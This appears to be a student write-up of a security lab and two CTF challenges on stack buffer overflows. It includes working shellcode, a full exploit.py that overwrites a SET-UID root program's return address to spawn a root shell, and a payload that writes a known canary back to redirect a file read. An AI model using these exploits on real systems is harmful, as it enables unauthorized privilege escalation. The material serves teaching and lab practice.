# Week 5

## Task 1
After compiling using `make`, we executed the a32.out or a64.out:

```bash
$ ./a32.out
$ ./a64.out
```


and a new shell appeared in the terminal.

![a32.out execution](../Week5/img/task_1_1.PNG)

![a64.out execution](../Week5/img/task_1_2.PNG)



## Task 2 and 3

In this task, we use this vulnerable SET-UID root program to gain access to the root shell. Since, we have disabled Address Space Layout Randomization, we know that our process will be stored  in  around the same memory always in  the  stack. So in order to find the address of the running program in the memory, we compile the program in debug mode. Debugging will help us run our desired program. 

So,  we  first  compile  the  program  in  the  debug  mode (-g  option),  with  the  StackGuard  counter-measure disabled and Stack executable and then run the program in debug mode using gdb:

![task_3_1](../Week5/img/task_3_1.png)

In gdb, we set a breakpoint on the bof function using b bof, and then start executing the program:

![task_3_2](../Week5/img/task_3_2.png)

The program stops inside the bof function due to the breakpoint created. The stack frame values for this function will be of our interest and will be used to construct the badfile contents. Here, we print out the ebp and buffer values, and also find the difference between the ebp and start of the buffer in order to find the return address value’s address. The following screenshot shows the steps:

![task_3_3](../Week5/img/task_3_3.png)

Here, we see that the frame pointer is `0xffffcf88` and hence the return address must be stored at `0xffffcf88 + 4`, and the first address we can jump to is `0xffffcf88 + 8`. Also, in order for the return address to point at our code, we need to know the location to store the return address in the input so  that it is stored in the return address  field  in  the  stack.  This  can  be found out by finding the difference between the return address and buffer start address, because our input is copied to the buffer from the start. We also know that return address will be 4 bytes above where the ebp points.

In the next step, we modify the exploit.py file to enter the new return address:

```python=
#!/usr/bin/python3
import sys
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))
##################################################################

# Put the shellcode somewhere in the payload
start = 200
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0xffffcf1c + start
offset = (0xffffcf88 - 0xffffcf1c) + 4

L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)


```

Next, we first make the python program executable and run the exploit.py file to generate the badfile. Then we run the vulnerable SET-UID program that uses this badfile as input and copies the contents of the file  in the stack, resulting in a buffer overflow. The `#` sign indicates that we have successfully obtained the root privilege by entering into the root shell. The effective user ID is seen to be that of the root (0): 

![task_3_4](../Week5/img/task_3_4.png)

Hence, we have successfully performed the buffer overflow attack and gained root privileges.

## CTF Challenge 1

First, we run `checksec` on the executable to analyse the file protections:

![ctf_c1_1](../Week5/img/ctf_c1_1.PNG)

As we can see, the protections are what was expected.

Reading the [main.c](../Week5/CTF/Semana5-Desafio1/main.c), we noted that:
- The file with name **mem.txt** is read by the program
- We can control what file is read by overflowing the ``buffer`` array. We write trash on the first 20 positions of the array, then we write the filename that we want the program to read (in this case, flag.txt), and finally we terminate the string with **\0**. In our case, the injected string was `"aaaaaaaaaaaaaaaaaaaaflag.txt\0"`

After identifying the vulnerability, we programmed the missing code on the [exploit](../Week5/CTF/Semana5-Desafio1/exploit.py) and executed it.

![ctf_c1_2](../Week5/img/ctf_c1_2.PNG)

## CTF Challenge 2

First, we run `checksec` on the executable to analyse the file protections:

![ctf_c2_1](../Week5/img/ctf_c1_1.PNG)

As we can see, the protections remainded the same
Reading the [main.c](../Week5/CTF/Semana5-Desafio1/main.c), we noted that:
- The code is similar to the one on the previous challenge. However, this version has a "canary" **0xfefc2122** between the buffer and the filename
- This protection doesn't mitigate the attack. We just need to write the canary between the buffer and the filename on the injected string. The new string to inject is represented by this line of code:

```python 
canary = 0xfefc2122
payload = bytes("a"*20 , 'utf-8') + canary.to_bytes(4, "little") + bytes("flag.txt\0" , 'utf-8')
```

The full code is on [exploit.py](../Week5/CTF/Semana5-Desafio2/exploit.py). When we run the exploit.py file, we are greeted with the flag


![ctf_c1_2](../Week5/img/ctf_c2_2.PNG)
